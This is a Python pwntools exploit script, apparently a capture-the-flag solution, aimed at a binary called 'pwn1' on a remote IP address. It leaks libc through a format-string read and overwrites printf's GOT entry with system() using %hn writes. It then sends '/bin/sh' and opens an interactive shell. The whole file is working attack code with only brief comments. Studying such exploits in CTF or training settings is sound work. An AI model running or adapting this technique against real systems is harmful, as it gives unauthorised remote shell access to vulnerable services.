#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *


#switches
DEBUG = 0
LOCAL = 0
VERBOSE = 0



elf = ELF('./pwn1')
if LOCAL:
    libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    p = process('./pwn1')#local processs
else:
    p = remote('115.28.185.220',11111)
    libc = ELF('libc32.so')

# simplified r/s function
def fms(data):
    p.recvuntil('input$')
    p.sendline('1')
    p.recvuntil('name:\n')
    p.sendline(data)
   
# define interactive functions here
def pwn():
#leak libc_base_addr
    fms('%35$p')
    if LOCAL:
    	libc_start_main_addr = int(p.recvn(10),16) - 247
    else:
    	libc_start_main_addr = int(p.recvn(10),16) - 243
    libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
    print 'libc.addr => ', hex(libc.address)


    printf_got = elf.got['printf']
    print 'printf_got => ' , hex(printf_got)

#find printf_addr & system_addr 
    system_addr = libc.symbols['system']
    print 'system_addr => ' , hex(system_addr)

#make stack
    make_stack = 'a' * 0x30 + p32(printf_got) + p32(printf_got + 0x1) 
    fms(make_stack)
    

    
#write system to printf
    payload = "%" + str(((system_addr & 0x000000FF))) + "x%18$hhn"
    payload += "%" + str(((system_addr & 0x00FFFF00) >> 8) - (system_addr & 0x000000FF)) + "x%19$hn" 
    print payload

#get shell
    fms(payload)
    p.sendline('/bin/sh\x00')
    p.interactive()

# define symbols and offsets here

if __name__ == '__main__': 
  
    pwn()
